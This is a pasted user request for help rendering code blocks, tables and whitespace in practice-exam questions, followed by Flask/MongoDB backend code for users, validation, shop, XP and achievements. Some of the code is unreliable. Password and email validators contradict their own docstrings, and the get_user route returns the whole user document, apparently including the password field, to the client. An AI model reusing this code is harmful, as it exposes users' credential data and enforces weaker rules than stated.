@@ -1,0 +1,7326 @@
+
+So I have quite a few tests simial rot this test, not just cloud+ concepts btui also cysa, penttest adn so on. and some of them have pbq style questions/ more techincial depth questions liek you see beelow- i chose this one specifically vbecasue it porbably ahs the most in depth PBQ tehcgicnal style questions, and what i mean by that is, they have liek actual code snippets or complex charts or whatver- liek and use alot of ``` or `, and like ```python or ```sql or ```javasicript, or liek i said just ``` or `. also liek quite alot or \n, or like just crazy looking charts like 
+
+"question": "A cloud administrator notices excessive costs in their AWS environment stemming from over-provisioned EC2 instances. After collecting the following metrics from CloudWatch for the past 30 days, they need to determine which instances should be rightsized:\n\n| Instance ID | Type | vCPU | Memory (GiB) | Max CPU (%) | Average CPU (%) | Max Memory (%) | Average Memory (%) | Monthly Cost |\n|------------|------|------|--------------|------------|----------------|----------------|-------------------|-------------|\n| i-1a2b3c4d | c5.2xlarge | 8 | 16 | 45% | 12% | 85% | 72% | $140 |\n| i-2b3c4d5e | r5.xlarge | 4 | 32 | 78% | 65% | 42% | 30% | $190 |\n| i-3c4d5e6f | m5.2xlarge | 8 | 32 | 30% | 18% | 28% | 22% | $230 |\n| i-4d5e6f7g | t3.medium | 2 | 4 | 92% | 82% | 88% | 75% | $30 |\n\nWhich instance should be prioritized for rightsizing to optimize cost without risking performance degradation?",
+
+
+or also thinsg liek this
+     "question": "A cloud engineer is implementing a high-performance data processing pipeline in AWS. The pipeline ingests data from multiple sources, transforms it, and loads it into a data warehouse for analysis. The engineer implements the following architecture:\n\n```\n                                        ┌─────────────┐\n                                        │             │\n                         ┌─────────────►  Firehose   ├─────────┐\n                         │              │             │         │\n┌──────────┐    ┌────────────────┐    └─────────────┘    ┌────▼─────┐\n│          │    │                │                         │          │\n│  Kinesis ├────►   Lambda      │                         │    S3    │\n│          │    │                │                         │          │\n└──────────┘    └───────┬────────┘                        └────┬─────┘\n                         │                                      │\n                         │         ┌─────────────┐             │\n                         │         │             │             │\n                         └────────►│    SQS     ├─────────────┘\n                                   │             │             │\n                                   └──────┬──────┘             │\n                                          │                    │\n                            ┌─────────────▼──────────┐        │\n                            │                         │        │\n                            │     Batch Processing    │◄───────┘\n                            │         Cluster         │\n                            │                         │\n                            └─────────────┬───────────┘\n                                          │\n                                          │\n                              ┌───────────▼─────────┐\n                              │                      │\n                              │   Data Warehouse    │\n                              │                      │\n                              └──────────────────────┘\n```\n\nThe pipeline is experiencing intermitt
+
+or also white spaces/spaces alot
+
+ "question": "A cloud engineer is deploying a multi-tier application in AWS with strict security requirements. The application consists of web, application, and database tiers. The network architecture must follow security best practices for isolation and access control. The engineer creates the following CloudFormation template excerpt to set up the VPC and subnets:\n\n```yaml\nResources:\n  VPC:\n    Type: AWS::EC2::VPC\n    Properties:\n      CidrBlock: 10.0.0.0/16\n      EnableDnsSupport: true\n      EnableDnsHostnames: true\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-VPC\n          \n  InternetGateway:\n    Type: AWS::EC2::InternetGateway\n    Properties:\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-IGW\n          \n  InternetGatewayAttachment:\n    Type: AWS::EC2::VPCGatewayAttachment\n    Properties:\n      InternetGatewayId: !Ref InternetGateway\n      VpcId: !Ref VPC\n      \n  PublicSubnet1:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [0, !GetAZs '']\n      CidrBlock: 10.0.1.0/24\n      MapPublicIpOnLaunch: true\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-PublicSubnet1\n          \n  PublicSubnet2:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [1, !GetAZs '']\n      CidrBlock: 10.0.2.0/24\n      MapPublicIpOnLaunch: true\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-PublicSubnet2\n          \n  AppSubnet1:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [0, !GetAZs '']\n      CidrBlock: 10.0.11.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-AppSubnet1\n          \n  AppSubnet2:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [1, !GetAZs '']\n      CidrBlock: 10.0.12.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-AppSubnet2\n          \n  DBSubnet1:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [0, !GetAZs '']\n      CidrBlock: 10.0.21.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-DBSubnet1\n          \n  DBSubnet2:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [1, !GetAZs '']\n      CidrBlock: 10.0.22.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-DBSubnet2\n          \n  PublicRouteTable:\n    Type: AWS::EC2::RouteTable\n    Properties:\n      VpcId: !Ref VPC\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-PublicRoutes\n          \n  DefaultPublicRoute:\n    Type: AWS::EC2::Route\n    DependsOn: InternetGatewayAttachment\n    Properties:\n      RouteTableId: !Ref PublicRouteTable\n      DestinationCidrBlock: 0.0.0.0/0\n      GatewayId: !Ref InternetGateway\n      \n  PublicSubnet1RouteTableAssociation:\n    Type: AWS::EC2::SubnetRouteTableAssociation\n    Properties:\n      RouteTableId: !Ref PublicRouteTable\n      SubnetId: !Ref PublicSubnet1\n      \n  PublicSubnet2RouteTableAssociation:\n    Type: AWS::EC2::SubnetRouteTableAssociation\n    Properties:\n      RouteTableId: !Ref PublicRouteTable\n      SubnetId: !Ref PublicSubnet2\n```\n\nWhich critical security component is missing from this VPC architecture?",
+
+
+
+so bacially its a mix of both backstsicks/tripel backtsicks liek ``` or `, and also whietspace, also alot of \n and so on.
+
+
+so for ocnetxt- i have a wbeiste that ahs practcie etst and these ar eteh practcie tests- however they dont show on screen liek they are supposed to sicne they use the stuff i mentioed they still just appear liek text- granted- the stuff i mentioed is still hiddne but they arent actually fuicntional- so like as an example the \n doesnt make a new line and satuff and so on.
+
+
+however some quyestiosn arenet super tehcinal and comoplcited/pbq they are just normal questions liek 
+
+"question": "A cloud engineer configures a multi-tier application in a VPC with web, application, and database servers. During testing, the database server experiences excessive CPU utilization when the application scales beyond 50 concurrent users. System logs show multiple connection establishments per user request. Which solution addresses the root cause of this issue?",
+
+
+
+so how can i make the tests appear/show/ be displayed they are written in the backedn so to speak- like if its \n it actually does creeate/shwo a newline- if it uses liek fro an example ```python then it actually show sup as p[ython synatx, and like or any other coing languang or if its just ```, and if teh whiet space is written it shwos upo liek that too so teh user has a better view of it yah know. so liek if it did !Ref PublicSubnet1\n      \n  PublicSubnet2RouteTableAssociation:\n lke it woudl wneed to not delet ethat whgietspace correct? additonally- some of them- only soem i think- dont wrap very well- liek they do soemhwat wrap but if you shroten your browsewr trhey liek go off teh screen weird or somrhting idk hwo to explain it- ill show you some poictures of how soem of them dont wrap well aswell as how they are appearingh to the suer- so also if code synatx is need fopr some of them then like have color for it aswell and stuff and dfo whetevr else is needed for tehse type of mroe in deptgh pbq style questions to appear lieka  real pbq intead of just a normal paragarph teh user can barely read lol
+
+
+pictures above
+
+
+so ill provide you my relavnt backend files asweell as my relaavnt frontend files
+
+
+i have 13 test pages and each of them get a unique (but same deisgna dfn fucntion its just to have sperate titles and gateh rteh test categoyr) testlist page adn "testpage" bu the testpaeg file is just top get teh category fro its respeive test catergroy page. so teh actual testpage liek trhe view of it is teh globaltestpage becasue lal of them have teh same fucntions fwi just for context
+
+so if teh edist are needed for frontend- please make them in teh globaltestpage- and key thing iwth that is DO NOT CHNAGE ANYTHING ELS EIN MY GLOBALTSTPAGE OR REMOVE ANYHTHING OR MESS ANY OTEH RFUCCNTIONLLIES UP, WE ARE ONLY FOCUSING ON TEH ISSUE I HAVE THAT I MENTIOED
+
+
+ill also provbid eyou my test.css which applies to all pages so if i need to add css blocks for whatver edit you do i can add them to the css and yoiu have conbtext as to whats alrady there. cool?
+
+
+ok so we will start with the backedn ffiles that are relevant.
+
+##################################
+# mongodb/database.py (mostly same)
+##################################
+from flask import Flask
+from flask_pymongo import PyMongo
+import os
+
+app = Flask(__name__)
+app.config["MONGO_URI"] = os.getenv("MONGO_URI")
+mongo = PyMongo(app)
+db = mongo.db
+
+mainusers_collection = db.mainusers
+shop_collection = db.shopItems
+achievements_collection = db.achievements
+tests_collection = db.tests
+testAttempts_collection = db.testAttempts
+correctAnswers_collection = db.correctAnswers
+dailyQuestions_collection = db.dailyQuestions
+dailyAnswers_collection = db.dailyAnswers
+supportThreads_collection = db.supportThreads
+# For suspicious activity
+auditLogs_collection = db.auditLogs
+# For caching if needed, but we used Redis above
+
+
+# models/test.py
+from bson.objectid import ObjectId
+from datetime import datetime, timedelta
+from collections import defaultdict
+import math
+import re
+import unicodedata
+import time
+from flask import g
+from functools import wraps
+
+# Import the new collections from database
+from mongodb.database import (
+    mainusers_collection,
+    shop_collection,
+    achievements_collection,
+    tests_collection,
+    testAttempts_collection,
+    correctAnswers_collection
+)
+
+##############################################
+# very complex Input Sanitization Helpers
+##############################################
+
+import re
+import unicodedata
+
+# Example small dictionary of very common passwords
+COMMON_PASSWORDS = {
+    "password", "123456", "12345678", "qwerty", "letmein", "welcome"
+}
+
+def has_forbidden_unicode_scripts(s):
+    """
+    Disallow characters from certain Unicode blocks 
+    (private use areas, surrogates, etc.).
+    """
+    private_use_ranges = [
+        (0xE000, 0xF8FF),
+        (0xF0000, 0xFFFFD),
+        (0x100000, 0x10FFFD)
+    ]
+    surrogates_range = (0xD800, 0xDFFF)
+
+    for ch in s:
+        code_point = ord(ch)
+        # Surrogates
+        if surrogates_range[0] <= code_point <= surrogates_range[1]:
+            return True
+        # Private use ranges
+        for start, end in private_use_ranges:
+            if start <= code_point <= end:
+                return True
+    return False
+
+def disallow_mixed_scripts(s):
+    """
+    Example check for mixing major scripts (Latin + Cyrillic, etc.).
+    Returns True if it detects more than one script in the string.
+    """
+    script_sets = set()
+
+    for ch in s:
+        cp = ord(ch)
+        # Basic Latin and extended ranges:
+        if 0x0041 <= cp <= 0x024F:
+            script_sets.add("Latin")
+        # Greek
+        elif 0x0370 <= cp <= 0x03FF:
+            script_sets.add("Greek")
+        # Cyrillic
+        elif 0x0400 <= cp <= 0x04FF:
+            script_sets.add("Cyrillic")
+
+        # If more than one distinct script is found
+        if len(script_sets) > 1:
+            return True
+
+    return False
+
+def validate_username(username):
+    """
+    Validates a username with very strict rules:
+      1. Normalize (NFC).
+      2. Length 3..30.
+      3. No control chars, no private-use/surrogates, no mixing scripts.
+      4. Only [A-Za-z0-9._-], no triple repeats, no leading/trailing punctuation.
+    Returns: (True, []) if valid, else (False, [list of error messages]).
+    """
+    errors = []
+    username_nfc = unicodedata.normalize("NFC", username)
+
+    # 1) Check length
+    if not (3 <= len(username_nfc) <= 30):
+        errors.append("Username must be between 3 and 30 characters long.")
+
+    # 2) Forbidden Unicode script checks
+    if has_forbidden_unicode_scripts(username_nfc):
+        errors.append("Username contains forbidden Unicode blocks (private use or surrogates).")
+
+    # 3) Disallow mixing multiple major scripts
+    if disallow_mixed_scripts(username_nfc):
+        errors.append("Username cannot mix multiple Unicode scripts (e.g., Latin & Cyrillic).")
+
+    # 4) Forbid control chars [0..31, 127] + suspicious punctuation
+    forbidden_ranges = [(0, 31), (127, 127)]
+    forbidden_chars = set(['<', '>', '\\', '/', '"', "'", ';', '`',
+                           ' ', '\t', '\r', '\n'])
+    for ch in username_nfc:
+        cp = ord(ch)
+        if any(start <= cp <= end for (start, end) in forbidden_ranges):
+            errors.append("Username contains forbidden control characters (ASCII 0-31 or 127).")
+            break
+        if ch in forbidden_chars:
+            errors.append("Username contains forbidden characters like <, >, or whitespace.")
+            break
+
+    # 5) Strict allowlist pattern
+    pattern = r'^[A-Za-z0-9._-]+$'
+    if not re.match(pattern, username_nfc):
+        errors.append("Username can only contain letters, digits, underscores, dashes, or dots.")
+
+    # 6) Disallow triple identical consecutive characters
+    if re.search(r'(.)\1{2,}', username_nfc):
+        errors.append("Username cannot contain three identical consecutive characters.")
+
+    # 7) Disallow leading or trailing punctuation
+    if re.match(r'^[._-]|[._-]$', username_nfc):
+        errors.append("Username cannot start or end with . - or _.")
+
+    if errors:
+        return False, errors
+    return True, []
+
+def validate_password(password, username=None, email=None):
+    """
+    Validates a password with very strict rules:
+      1. 12..128 length.
+      2. Disallow whitespace, <, >.
+      3. Require uppercase, lowercase, digit, special char.
+      4. Disallow triple repeats.
+      5. Check common/breached password list.
+      6. Disallow 'password', 'qwerty', etc.
+      7. Disallow if username or email local part is in the password.
+    Returns: (True, []) if valid, else (False, [list of error messages]).
+    """
+    errors = []
+    length = len(password)
+
+    # 1) Length
+    if not (6 <= length <= 69):
+        errors.append("Password must be between 6 and 69 characters long.")
+
+    # 2) Disallowed whitespace or < >
+    if any(ch in password for ch in [' ', '<', '>', '\t', '\r', '\n']):
+        errors.append("Password cannot contain whitespace or < or > characters.")
+
+    # 3) Complexity checks
+    if not re.search(r'[A-Z]', password):
+        errors.append("Password must contain at least one uppercase letter.")
+    if not re.search(r'[a-z]', password):
+        errors.append("Password must contain at least one lowercase letter.")
+    if not re.search(r'\d', password):
+        errors.append("Password must contain at least one digit.")
+
+    # We define a broad set of allowed special chars
+    special_pattern = r'[!@#$%^&*()\-_=+\[\]{}|;:\'",<.>/?`~\\]'
+    if not re.search(special_pattern, password):
+        errors.append("Password must contain at least one special character.")
+
+    # 4) Disallow triple identical consecutive characters
+    if re.search(r'(.)\1{2,}', password):
+        errors.append("Password must not contain three identical consecutive characters.")
+
+    # 5) Convert to lowercase for simplified checks
+    password_lower = password.lower()
+
+    # Check against common password list
+    if password_lower in COMMON_PASSWORDS:
+        errors.append("Password is too common. Please choose a stronger password.")
+
+    # 6) Disallow certain dictionary words
+    dictionary_patterns = ['password', 'qwerty', 'abcdef', 'letmein', 'welcome', 'admin']
+    for pat in dictionary_patterns:
+        if pat in password_lower:
+            errors.append(f"Password must not contain the word '{pat}'.")
+
+    # 7) Disallow if password contains username or email local-part
+    if username:
+        if username.lower() in password_lower:
+            errors.append("Password must not contain your username.")
+
+    if email:
+        email_local_part = email.split('@')[0].lower()
+        if email_local_part in password_lower:
+            errors.append("Password must not contain the local part of your email address.")
+
+    if errors:
+        return False, errors
+    return True, []
+
+def validate_email(email):
+    """
+    Validates an email with strict rules:
+      1. Normalize (NFC), strip whitespace.
+      2. 5..69 length.
+      3. No control chars, <, >, etc.
+      4. Exactly one @.
+    Returns: (True, []) if valid, else (False, [list of error messages]).
+    """
+    errors = []
+    email_nfc = unicodedata.normalize("NFC", email.strip())
+
+    # 1) Length check
+    if not (5 <= len(email_nfc) <= 69):
+        errors.append("Email length must be between 6 and 69 characters.")
+
+    # 3) Forbid suspicious ASCII
+    forbidden_ascii = set(['<','>','`',';',' ', '\t','\r','\n','"',"'", '\\'])
+    for ch in email_nfc:
+        if ch in forbidden_ascii:
+            errors.append("Email contains forbidden characters like <, >, or whitespace.")
+            break
+
+    # 4) Must have exactly one @
+    if email_nfc.count('@') != 1:
+        errors.append("Email must contain exactly one '@' symbol.")
+
+    if errors:
+        return False, errors
+    return True, []
+
+##############################################
+# User Retrieval Helpers
+##############################################
+
+def get_user_by_username(username):
+    return mainusers_collection.find_one({"username": username})
+
+def get_user_by_identifier(identifier):
+    if "@" in identifier:
+        return mainusers_collection.find_one({"email": identifier})
+    else:
+        return get_user_by_username(identifier)
+
+def get_user_by_id(user_id):
+    """
+    Retrieves a user by ID. Returns None if invalid or not found.
+    """
+    try:
+        oid = ObjectId(user_id)
+    except Exception:
+        return None
+    return mainusers_collection.find_one({"_id": oid})
+
+##############################################
+# Create User
+##############################################
+
+def create_user(user_data):
+    existing_user = mainusers_collection.find_one({
+        "$or": [
+            {"username": user_data["username"]},
+            {"email": user_data["email"]}
+        ]
+    })
+    if existing_user:
+        raise ValueError("Username or email is already taken")
+
+    # Default fields
+    user_data.setdefault("coins", 0)
+    user_data.setdefault("xp", 0)
+    user_data.setdefault("level", 1)
+    user_data.setdefault("achievements", [])
+    user_data.setdefault("subscriptionActive", False)
+    user_data.setdefault("subscriptionPlan", None)
+    user_data.setdefault("lastDailyClaim", None)
+    user_data.setdefault("purchasedItems", [])
+    user_data.setdefault("xpBoost", 1.0)
+    user_data.setdefault("currentAvatar", None)
+    user_data.setdefault("nameColor", None)
+
+    # If you want to ensure new users have the 'achievement_counters'
+    # from Day 1, do it here:
+    user_data.setdefault("achievement_counters", {
+        "total_tests_completed": 0,
+        "perfect_tests_count": 0,
+        "perfect_tests_by_category": {},
+        # "consecutive_perfect_streak": 0, # removing memory_master
+        "highest_score_ever": 0.0,
+        "lowest_score_ever": 100.0,
+        "total_questions_answered": 0,
+        # "tests_completed_by_category": {}, # optional
+        # "tests_completed_set": set()       # optional
+    })
+
+    # Auto-equip default avatar if cost=None
+    default_avatar = shop_collection.find_one({"type": "avatar", "cost": None})
+    if default_avatar:
+        user_data["currentAvatar"] = default_avatar["_id"]
+        if default_avatar["_id"] not in user_data["purchasedItems"]:
+            user_data["purchasedItems"].append(default_avatar["_id"])
+
+    result = mainusers_collection.insert_one(user_data)
+    return result.inserted_id
+
+##############################################
+# Update User Fields (CRITICAL)
+##############################################
+
+def update_user_fields(user_id, fields):
+    """
+    Generic helper to update given `fields` (dict) in mainusers_collection.
+    """
+    try:
+        oid = ObjectId(user_id)
+    except:
+        return None
+    mainusers_collection.update_one(
+        {"_id": oid},
+        {"$set": fields}
+    )
+    return True
+
+##############################################
+# Update User Coins
+##############################################
+
+def update_user_coins(user_id, amount):
+    try:
+        oid = ObjectId(user_id)
+    except Exception:
+        return None
+    mainusers_collection.update_one({"_id": oid}, {"$inc": {"coins": amount}})
+
+##############################################
+# Leveling System
+##############################################
+# Levels 2–30: +500 XP each
+# Levels 31–60: +750 XP each
+# Levels 61–100: +1000 XP each
+# Above 100: +1500 XP each
+
+def xp_required_for_level(level):
+    """
+    Returns total XP required to be at `level`.
+    Level 1 starts at 0 XP.
+    """
+    if level < 1:
+        return 0
+    if level == 1:
+        return 0
+    if level <= 30:
+        return 500 * (level - 1)
+    elif level <= 60:
+        base = 500 * 29  # up to level 30
+        return base + 750 * (level - 30)
+    elif level <= 100:
+        base = 500 * 29 + 750 * 30  # up to level 60
+        return base + 1000 * (level - 60)
+    else:
+        base = 500 * 29 + 750 * 30 + 1000 * 40  # up to level 100
+        return base + 1500 * (level - 100)
+
+def update_user_xp(user_id, xp_to_add):
+    """
+    Adds xp_to_add to the user's XP. Then, while the new XP total
+    is >= XP required for the next level, increments the level.
+    """
+    user = get_user_by_id(user_id)
+    if not user:
+        return None
+
+    old_xp = user.get("xp", 0)
+    old_level = user.get("level", 1)
+    new_xp = old_xp + xp_to_add
+    new_level = old_level
+
+    while new_xp >= xp_required_for_level(new_level + 1):
+        new_level += 1
+
+    mainusers_collection.update_one(
+        {"_id": user["_id"]},
+        {"$set": {"xp": new_xp, "level": new_level}}
+    )
+    return {"xp": new_xp, "level": new_level}
+
+
+
+##############################################
+# Shop Logic
+##############################################
+
+def get_shop_items():
+    """
+    Returns all shop items from shop_collection,
+    in ascending order by title (or another field),
+    to ensure stable ordering.
+    """
+    return list(shop_collection.find({}).sort("title", 1))
+
+def purchase_item(user_id, item_id):
+    """
+    Purchase an item from the shop:
+      1) Check user has enough coins
+      2) Ensure item not already purchased
+      3) Deduct cost, add to purchasedItems
+      4) If xpBoost, set user's xpBoost
+      5) If avatar or nameColor, optionally set that field
+    """
+    user = get_user_by_id(user_id)
+    if not user:
+        return {"success": False, "message": "User not found"}
+
+    try:
+        oid = ObjectId(item_id)
+    except Exception:
+        return {"success": False, "message": "Invalid item ID"}
+
+    item = shop_collection.find_one({"_id": oid})
+    if not item:
+        return {"success": False, "message": "Item not found"}
+
+    user_coins = user.get("coins", 0)
+    cost = item.get("cost", 0) if item.get("cost") is not None else 0
+    if user_coins < cost:
+        return {"success": False, "message": "Not enough coins"}
+
+    purchased = user.get("purchasedItems", [])
+    if oid in purchased:
+        return {"success": False, "message": "Item already purchased"}
+
+    mainusers_collection.update_one(
+        {"_id": user["_id"]},
+        {"$inc": {"coins": -cost}}
+    )
+    mainusers_collection.update_one(
+        {"_id": user["_id"]},
+        {"$addToSet": {"purchasedItems": oid}}
+    )
+
+    item_type = item.get("type")
+    if item_type == "xpBoost":
+        new_boost = item.get("effectValue", 1.0)
+        mainusers_collection.update_one(
+            {"_id": user["_id"]},
+            {"$set": {"xpBoost": new_boost}}
+        )
+    elif item_type == "avatar":
+        pass
+    elif item_type == "nameColor":
+        new_color = item.get("effectValue", None)
+        mainusers_collection.update_one(
+            {"_id": user["_id"]},
+            {"$set": {"nameColor": new_color}}
+        )
+
+    return {"success": True, "message": "Purchase successful"}
+
+##############################################
+# Achievements
+##############################################
+
+def get_achievements():
+    return list(achievements_collection.find({}))
+    
+
+    
+    
+
+def get_test_by_id_and_category(test_id, category):
+    """
+    Fetch a single test doc by integer testId field and category field.
+    """
+    try:
+        test_id_int = int(test_id)
+    except:
+        return None
+    return tests_collection.find_one({
+        "testId": test_id_int,
+        "category": category
+    })
+
+
+    
+   
+
+def apply_daily_bonus(user_id):
+    user = get_user_by_id(user_id)
+    if not user:
+        return None
+
+    now = datetime.utcnow()
+    last_claim = user.get("lastDailyClaim")
+    if not last_claim or (now - last_claim) > timedelta(hours=24):
+        mainusers_collection.update_one(
+            {"_id": user["_id"]},
+            {
+                "$inc": {"coins": 250},
+                "$set": {"lastDailyClaim": now}
+            }
+        )
+        return {"success": True, "message": "Daily bonus applied"}
+    else:
+        return {"success": False, "message": "Already claimed daily bonus."}
+
+def award_correct_answers_in_bulk(user_id, attempt_doc, xp_per_correct=10, coins_per_correct=5):
+    """
+    For examMode attempts, no XP was awarded during question-by-question.
+    So at 'finish', we do the awarding for each newly-correct question that
+    the user has never gotten correct before (per correctAnswers_collection).
+    """
+    user = get_user_by_id(user_id)
+    if not user:
+        return
+
+    test_id = attempt_doc.get("testId")
+    answers = attempt_doc.get("answers", [])
+
+    # Tally how many new first-time correct answers the user got in this attempt
+    newly_correct_count = 0
+    for ans in answers:
+        if ans.get("userAnswerIndex") == ans.get("correctAnswerIndex"):
+            # it's correct
+            qid = ans.get("questionId")
+            already_correct = correctAnswers_collection.find_one({
+                "userId": user["_id"],
+                "testId": str(test_id),
+                "questionId": qid
+            })
+            if not already_correct:
+                # Insert it and increment counters
+                correctAnswers_collection.insert_one({
+                    "userId": user["_id"],
+                    "testId": str(test_id),
+                    "questionId": qid
+                })
+                newly_correct_count += 1
+
+    if newly_correct_count > 0:
+        # apply xp, coins
+        total_xp = xp_per_correct * newly_correct_count
+        total_coins = coins_per_correct * newly_correct_count
+        update_user_xp(user_id, total_xp)
+        update_user_coins(user_id, total_coins)    
+
+
+
+
+# helpers/db_timing.py
+
+
+def measure_db_operation(func):
+    """
+    Decorator to measure time of a single DB operation.
+    Usage: decorate your typical DB calls or your function that does the operation.
+    """
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        start = time.time()
+        result = func(*args, **kwargs)
+        duration = time.time() - start
+
+        # If we have a 'db_time_accumulator' in Flask g, accumulate:
+        if not hasattr(g, "db_time_accumulator"):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return result
+    return wrapper
+
+# ================================
+# test_routes.py
+# ================================
+
+from flask import Blueprint, request, jsonify, session, g  # <-- Added g here for DB time measurement
+from bson.objectid import ObjectId
+from datetime import datetime, timedelta
+import pytz
+import time
+from mongodb.database import db
+
+# Mongo collections
+from mongodb.database import (
+    mainusers_collection,
+    shop_collection,
+    achievements_collection,
+    tests_collection,
+    testAttempts_collection,
+    correctAnswers_collection,
+    dailyQuestions_collection,
+    dailyAnswers_collection
+)
+
+# Models
+from models.test import (
+    get_user_by_identifier,
+    create_user,
+    get_user_by_id,
+    update_user_coins,
+    update_user_xp,
+    apply_daily_bonus,
+    get_shop_items,
+    purchase_item,
+    get_achievements,
+    get_test_by_id_and_category,
+    validate_username,
+    validate_email,
+    validate_password,
+    update_user_fields,
+    get_user_by_id,
+    award_correct_answers_in_bulk
+)
+
+api_bp = Blueprint('test', __name__)
+public_leaderboard_bp = Blueprint('public_leaderboard', __name__)
+#############################################
+# Leaderboard Caching Setup (15-second TTL)
+#############################################
+leaderboard_cache = []
+leaderboard_cache_timestamp = 0
+LEADERBOARD_CACHE_DURATION_MS = 15000  # 15 seconds
+
+def serialize_user(user):
+    """Helper to convert _id, etc. to strings if needed."""
+    if not user:
+        return None
+    user['_id'] = str(user['_id'])
+    if 'currentAvatar' in user and user['currentAvatar']:
+        user['currentAvatar'] = str(user['currentAvatar'])
+    if 'purchasedItems' in user and isinstance(user['purchasedItems'], list):
+        user['purchasedItems'] = [str(item) for item in user['purchasedItems']]
+    return user
+
+def serialize_datetime(dt):
+    """Helper: convert a datetime to an ISO string (or return None)."""
+    return dt.isoformat() if dt else None
+
+
+
+def check_and_unlock_achievements(user_id):
+    start_db = time.time()
+    user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user:
+        return []
+
+    counters = user.get("achievement_counters", {})
+    unlocked = set(user.get("achievements", []))
+    newly_unlocked = []
+
+    start_db = time.time()
+    all_ach = list(achievements_collection.find({}))  # or get_achievements()
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    for ach in all_ach:
+        aid = ach["achievementId"]
+        # If already unlocked, skip
+        if aid in unlocked:
+            continue
+
+        crit = ach.get("criteria", {})
+
+        # 1) testCount => total_tests_completed
+        test_count_req = crit.get("testCount")
+        if test_count_req is not None:
+            if counters.get("total_tests_completed", 0) >= test_count_req:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 2) minScore => e.g. "accuracy_king" with 90
+        min_score_req = crit.get("minScore")
+        if min_score_req is not None:
+            if counters.get("highest_score_ever", 0) >= min_score_req:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 3) perfectTests => e.g. "perfectionist_1", "double_trouble_2", etc.
+        perfect_req = crit.get("perfectTests")
+        if perfect_req is not None:
+            if counters.get("perfect_tests_count", 0) >= perfect_req:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 4) coins => coin achievements
+        coin_req = crit.get("coins")
+        if coin_req is not None:
+            if user.get("coins", 0) >= coin_req:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 5) level => e.g. "level_up_5", "mid_tier_grinder_25", etc.
+        level_req = crit.get("level")
+        if level_req is not None:
+            if user.get("level", 1) >= level_req:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 6) totalQuestions => e.g. "answer_machine_1000"
+        total_q_req = crit.get("totalQuestions")
+        if total_q_req is not None:
+            if counters.get("total_questions_answered", 0) >= total_q_req:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 7) perfectTestsInCategory => "category_perfectionist"
+        perfect_in_cat_req = crit.get("perfectTestsInCategory")
+        if perfect_in_cat_req is not None:
+            perfect_by_cat = counters.get("perfect_tests_by_category", {})
+            for cat_name, cat_count in perfect_by_cat.items():
+                if cat_count >= perfect_in_cat_req:
+                    unlocked.add(aid)
+                    newly_unlocked.append(aid)
+                    break
+            continue
+
+        # 8) redemption_arc => minScoreBefore + minScoreAfter
+        min_before = crit.get("minScoreBefore")
+        min_after = crit.get("minScoreAfter")
+        if min_before is not None and min_after is not None:
+            if (counters.get("lowest_score_ever", 100) <= min_before and
+                counters.get("highest_score_ever", 0) >= min_after):
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+        # 9) testsCompletedInCategory => "subject_finisher"
+        cat_required = crit.get("testsCompletedInCategory")
+        if cat_required is not None:
+            tcbc = counters.get("tests_completed_by_category", {})
+            for cat_name, test_set in tcbc.items():
+                if len(test_set) >= cat_required:
+                    unlocked.add(aid)
+                    newly_unlocked.append(aid)
+                    break
+            continue
+
+        # 10) allTestsCompleted => "test_finisher"
+        if crit.get("allTestsCompleted"):
+            user_completed_tests = counters.get("tests_completed_set", set())
+            TOTAL_TESTS = 130
+            if len(user_completed_tests) >= TOTAL_TESTS:
+                unlocked.add(aid)
+                newly_unlocked.append(aid)
+                continue
+
+    if newly_unlocked:
+        start_db = time.time()
+        mainusers_collection.update_one(
+            {"_id": user["_id"]},
+            {"$set": {"achievements": list(unlocked)}}
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    return newly_unlocked
+
+
+# -------------------------------------------------------------------
+# USER ROUTES
+# -------------------------------------------------------------------
+@api_bp.route('/user/<user_id>', methods=['GET'])
+def get_user(user_id):
+    start_db = time.time()
+    user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user:
+        return jsonify({"error": "User not found"}), 404
+    user = serialize_user(user)
+    if "password" not in user:
+        user["password"] = user.get("password")
